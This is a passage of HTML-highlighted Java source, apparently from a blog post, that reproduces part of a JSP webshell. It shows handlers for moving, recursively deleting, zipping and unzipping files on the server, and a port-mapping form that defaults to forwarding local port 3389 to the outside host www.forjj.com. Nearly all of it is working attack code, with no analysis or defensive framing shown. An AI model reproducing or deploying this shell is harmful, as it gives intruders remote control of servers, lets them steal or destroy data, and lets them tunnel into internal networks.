<span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> src = <span class="built_in">request</span>.getParameter(<span class="string">"src"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> target  = <span class="built_in">request</span>.getParameter(<span class="string">"to"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(target) &amp;&amp; !Util.<span class="built_in">isEmpty</span>(src)) &#123;</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(src);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(file.renameTo(<span class="keyword">new</span> File(target))) &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Move File Success!"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> msg = <span class="string">"Move File Failed!"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (file.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">msg += <span class="string">"The Move Will Failed When The Directory Is Not Empty."</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,msg);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> RemoteDirInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> dir = <span class="built_in">request</span>.getParameter(<span class="string">"dir"</span>);</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(dir);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (file.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">deleteFile(file);</span></span><br><span class="line"><span class="vbscript">deleteDir(file);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Remove Directory Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void deleteFile(File f) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.isFile()) &#123;</span></span><br><span class="line"><span class="vbscript">f.delete();</span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">File[] list = f.listFiles();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File ff:list) &#123;</span></span><br><span class="line"><span class="vbscript">deleteFile(ff);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void deleteDir(File f) &#123;</span></span><br><span class="line"><span class="vbscript">File[] list = f.listFiles();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (list.length == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="vbscript">f.delete();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File ff:list) &#123;</span></span><br><span class="line"><span class="vbscript">deleteDir(ff);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">deleteDir(f);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> PackBatchInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> files = <span class="built_in">request</span>.getParameter(<span class="string">"files"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(files))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> saveFileName = <span class="built_in">request</span>.getParameter(<span class="string">"savefilename"</span>);</span></span><br><span class="line"><span class="vbscript">File saveF = <span class="keyword">new</span> File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (saveF.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"The File \""+saveFileName+"</span>\<span class="string">" Has Been Exists!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">ZipOutputStream zout = <span class="keyword">new</span> ZipOutputStream(<span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(saveF)));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span>[] arr = files.<span class="built_in">split</span>(<span class="string">","</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">String</span> f:arr) &#123;</span></span><br><span class="line"><span class="vbscript">File pF = <span class="keyword">new</span> File(JSession.getAttribute(CURRENT_DIR).toString(),f);</span></span><br><span class="line"><span class="vbscript">ZipEntry entry = <span class="keyword">new</span> ZipEntry(pF.getName());</span></span><br><span class="line"><span class="vbscript">zout.putNextEntry(entry);</span></span><br><span class="line"><span class="vbscript">FileInputStream fInput = <span class="keyword">new</span> FileInputStream(pF);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript">byte[] buf = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((<span class="built_in">len</span> = fInput.read(buf)) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">zout.write(buf, <span class="number">0</span>, <span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript">zout.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">fInput.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">zout.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Pack Files Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> PackInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> packedFile = <span class="built_in">request</span>.getParameter(<span class="string">"packedfile"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(packedFile))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> saveFileName = <span class="built_in">request</span>.getParameter(<span class="string">"savefilename"</span>);</span></span><br><span class="line"><span class="vbscript">File saveF = <span class="keyword">new</span> File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (saveF.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"The File \""+saveFileName+"</span>\<span class="string">" Has Been Exists!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">File pF = <span class="keyword">new</span> File(packedFile);</span></span><br><span class="line"><span class="vbscript">ZipOutputStream zout = <span class="keyword">new</span> ZipOutputStream(<span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(saveF)));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> base = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (pF.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">zipDir(pF,base,zout);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">zipFile(pF,base,zout);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">zout.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Pack File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void zipDir(File f,<span class="built_in">String</span> base,ZipOutputStream zout)  throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">File[] arr = f.listFiles();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File ff:arr) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> tmpBase = base;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(tmpBase) &amp;&amp; !tmpBase.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">tmpBase += <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">zipDir(ff,tmpBase+f.getName(),zout);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> tmpBase = base;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(tmpBase) &amp;&amp;!tmpBase.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">tmpBase += <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">zipFile(f,tmpBase,zout);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void zipFile(File f,<span class="built_in">String</span> base,ZipOutputStream zout) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">ZipEntry entry = <span class="keyword">new</span> ZipEntry(base+f.getName());</span></span><br><span class="line"><span class="vbscript">zout.putNextEntry(entry);</span></span><br><span class="line"><span class="vbscript">FileInputStream fInput = <span class="keyword">new</span> FileInputStream(f);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript">byte[] buf = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((<span class="built_in">len</span> = fInput.read(buf)) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">zout.write(buf, <span class="number">0</span>, <span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript">zout.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">fInput.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> UnPackInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> savepath = <span class="built_in">request</span>.getParameter(<span class="string">"savepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> zipfile = <span class="built_in">request</span>.getParameter(<span class="string">"zipfile"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(savepath) || Util.<span class="built_in">isEmpty</span>(zipfile))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">File save = <span class="keyword">new</span> File(savepath);</span></span><br><span class="line"><span class="vbscript">save.mkdirs();</span></span><br><span class="line"><span class="vbscript">ZipFile file = <span class="keyword">new</span> ZipFile(<span class="keyword">new</span> File(zipfile));   </span></span><br><span class="line"><span class="vbscript">Enumeration e = file.entries();   </span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (e.hasMoreElements()) &#123;   </span></span><br><span class="line"><span class="vbscript">ZipEntry en = (ZipEntry) e.nextElement(); </span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> entryPath = en.getName();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> index = entryPath.lastIndexOf(<span class="string">"/"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span></span><br><span class="line"><span class="vbscript">entryPath = entryPath.substring(<span class="number">0</span>,index);</span></span><br><span class="line"><span class="vbscript">File absEntryFile = <span class="keyword">new</span> File(save,entryPath);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!absEntryFile.exists() &amp;&amp; (en.isDirectory() || en.getName().indexOf(<span class="string">"/"</span>) != <span class="number">-1</span>)) </span></span><br><span class="line"><span class="vbscript">absEntryFile.mkdirs();</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream output = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">BufferedInputStream input = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">output = <span class="keyword">new</span> BufferedOutputStream(   </span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(save,en.getName())));   </span></span><br><span class="line"><span class="vbscript">input = <span class="keyword">new</span> BufferedInputStream(   </span></span><br><span class="line"><span class="vbscript">file.getInputStream(en));   </span></span><br><span class="line"><span class="vbscript">byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];   </span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = input.read(b);   </span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;   </span></span><br><span class="line"><span class="vbscript">output.write(b, <span class="number">0</span>, <span class="built_in">len</span>);   </span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = input.read(b);   </span></span><br><span class="line"><span class="vbscript">&#125;   </span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="vbscript">&#125; finally &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (output != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">output.close();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (input != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">input.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception ex1) &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">file.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Unzip File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VMapPort</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VmpInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">Object localIP = JSession.getAttribute(<span class="string">"localIP"</span>);</span></span><br><span class="line"><span class="vbscript">Object localPort = JSession.getAttribute(<span class="string">"localPort"</span>);</span></span><br><span class="line"><span class="vbscript">Object remoteIP = JSession.getAttribute(<span class="string">"remoteIP"</span>);</span></span><br><span class="line"><span class="vbscript">Object remotePort = JSession.getAttribute(<span class="string">"remotePort"</span>);</span></span><br><span class="line"><span class="vbscript">Object done = JSession.getAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"localIP"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"localPort"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"remoteIP"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"remotePort"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(localIP))</span></span><br><span class="line"><span class="vbscript">localIP = InetAddress.getLocalHost().getHostAddress();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(localPort))</span></span><br><span class="line"><span class="vbscript">localPort = <span class="string">"3389"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(remoteIP))</span></span><br><span class="line"><span class="vbscript">remoteIP = <span class="string">"www.forjj.com"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(remotePort))</span></span><br><span class="line"><span class="vbscript">remotePort = <span class="string">"80"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(done))</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,done.toString());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>mapPort\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;&lt;h2 id=\"</span>Bin_H2_Title\<span class="string">"&gt;PortMap &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;div id=\"</span>hOWTm\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">4</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">" style=\"</span>margin:<span class="number">10</span>px <span class="number">0</span>;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">5</span>%\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Local Ip :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>localIP\<span class="string">" id=\"</span>localIP\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+localIP+"</span>\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Local Port :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>localPort\<span class="string">" id=\"</span>localPort\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+localPort+"</span>\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Remote Ip :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>remoteIP\<span class="string">" id=\"</span>remoteIP\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+remoteIP+"</span>\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">20</span>%\<span class="string">" align=\"</span><span class="built_in">left</span>\<span class="string">"&gt;Remote Port :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>remotePort\<span class="string">" id=\"</span>remotePort\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+remotePort+"</span>\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td colspan=\"</span><span class="number">5</span>\<span class="string">"&gt;&lt;br/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input type=\"</span>submit\<span class="string">" name=\"</span>FJE\<span class="string">" value=\"</span>MapPort\<span class="string">" id=\"</span>FJE\<span class="string">" class=\"</span>bt\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;input type=\"</span>button\<span class="string">" name=\"</span>giX\<span class="string">" value=\"</span>ClearAll\<span class="string">" id=\"</span>giX\<span class="string">" onClick=\"</span>location.href=<span class="comment">'"+SHELL_NAME+"?o=smp'\" class=\"bt\" /&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//StopMapPort</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> SmpInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">ServerSocket <span class="built_in">server</span> = (ServerSocket)JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">server</span>.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"Stop Success!"</span>);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vmp"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span 